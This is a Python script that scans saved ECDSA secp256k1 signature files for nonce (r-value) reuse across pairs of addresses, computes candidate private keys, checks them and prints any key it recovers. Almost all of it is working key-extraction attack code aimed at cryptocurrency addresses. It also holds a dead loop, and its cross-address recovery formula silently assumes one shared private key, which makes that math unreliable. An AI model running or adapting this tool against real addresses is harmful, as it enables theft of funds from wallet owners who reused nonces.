import json
import os
import sys
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key

P = SECP256k1.order

def find_cross_collisions(sigs1, addr1, sigs2, addr2):
    print(f"Checking for cross-address collisions between {addr1} and {addr2}...")
    
    prep1 = []
    for s in sigs1:
        try:
            s_inv = pow(s['s'], -1, P)
            prep1.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P})
        except: continue
        
    prep2 = []
    for s in sigs2:
        try:
            s_inv = pow(s['s'], -1, P)
            prep2.append({'u': (s_inv * s['z']) % P, 't': (s_inv * s['r']) % P})
        except: continue
        
    for i, p1 in enumerate(prep1):
        for j, p2 in enumerate(prep2):
            # If k1 = k2 (mod P)
            # u1 + t1*d1 = u2 + t2*d2
            # But we don't know d1 or d2.
            # However, if d1 = d2 (same key, different address?) unlikely.
            
            # What if r1 = r2?
            # s1 = (z1 + r1*d1)/k1
            # s2 = (z2 + r2*d2)/k2
            # If k1 = k2 AND r1 = r2:
            # s1*k = z1 + r*d1
            # s2*k = z2 + r*d2
            # k = (z1 + r*d1)/s1 = (z2 + r*d2)/s2
            # s2*(z1 + r*d1) = s1*(z2 + r*d2)
            # s2*z1 + s2*r*d1 = s1*z2 + s1*r*d2
            # This doesn't help unless d1 and d2 are related.
            pass
            
    # If R-reuse ACROSS addresses (r1 = r2)
    r_map = {}
    for i, s in enumerate(sigs1):
        r_map[s['r']] = (addr1, s)
        
    for j, s in enumerate(sigs2):
        if s['r'] in r_map:
            addr_other, s_other = r_map[s['r']]
            print(f"!!! CROSS-ADDRESS R-REUSE FOUND !!!")
            print(f"  R: {hex(s['r'])}")
            print(f"  Address 1: {addr1}")
            print(f"  Address 2: {addr2}")
            # If k is same, k = (z1-z2)/(s1-s2)
            # Then d1 = (s1*k - z1)/r
            # Then d2 = (s2*k - z2)/r
            
            if s_other['s'] == s['s']:
                if s_other['z'] == s['z']:
                    print(f"  Same signature (R, S, Z) across addresses!")
                continue
                
            try:
                k = ((s_other['z'] - s['z']) * pow(s_other['s'] - s['s'], -1, P)) % P
                d1 = ((s_other['s'] * k - s_other['z']) * pow(s_other['r'], -1, P)) % P
                d2 = ((s['s'] * k - s['z']) * pow(s['r'], -1, P)) % P
                
                if verify_key(d1, addr1):
                    print(f"!!! SUCCESS !!! Key for {addr1} found!")
                    print(f"  Key: {hex(d1)}")
                if verify_key(d2, addr2):
                    print(f"!!! SUCCESS !!! Key for {addr2} found!")
                    print(f"  Key: {hex(d2)}")
            except ValueError:
                print(f"  Warning: s_diff not invertible for R: {hex(s['r'])}")

if __name__ == "__main__":
    # Scan all sig_*.json files
    files = [f for f in os.listdir('.') if f.startswith('sigs_') and f.endswith('.json')]
    addr_sigs = {}
    for f in files:
        addr = f.split('_')[1].split('.')[0]
        # Skip subset/all files
        if 'subset' in f or 'all' in f: continue
        with open(f, 'r') as jf:
            addr_sigs[addr] = json.load(jf)
            
    addrs = list(addr_sigs.keys())
    for i in range(len(addrs)):
        for j in range(i + 1, len(addrs)):
            find_cross_collisions(addr_sigs[addrs[i]], addrs[i], addr_sigs[addrs[j]], addrs[j])
